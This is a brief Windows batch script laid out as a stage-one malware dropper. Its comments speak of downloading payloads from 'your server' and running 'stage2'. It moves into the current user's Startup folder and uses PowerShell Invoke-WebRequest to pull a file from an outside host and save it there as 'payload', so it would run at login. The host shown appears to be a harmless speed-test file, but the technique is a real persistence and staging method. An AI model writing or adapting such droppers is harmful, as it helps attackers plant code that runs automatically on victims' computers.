@echo off

@REM Detect current path
set INITIAL=%cd%
echo %INITIAL% 

@REM download payloads from your server and run
set STARTUP="C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
cd %STARTUP% 

@REM run stage2
powershell -c "Invoke-WebRequest -Uri 'speedtest.ftp.otenet.gr/files/test100k.db' -OutFile 'payload'"


@REM back to last path
cd %INITIAL%

